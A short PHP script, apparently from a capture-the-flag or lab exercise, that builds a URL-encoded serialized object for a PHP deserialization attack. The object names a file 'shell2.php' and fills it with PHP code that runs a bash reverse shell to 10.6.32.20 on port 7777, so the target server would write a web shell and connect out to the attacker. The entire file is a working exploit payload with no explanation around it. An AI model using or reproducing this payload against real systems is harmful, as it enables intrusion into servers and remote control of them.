<?php

class FormSubmit {
	public $form_file = 'shell2.php';
	public $message = '<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/10.6.32.20/7777 0>&1\'");';
	//public $message = "yolo";
}

$application = new FormSubmit;
echo urlencode(serialize($application));

?>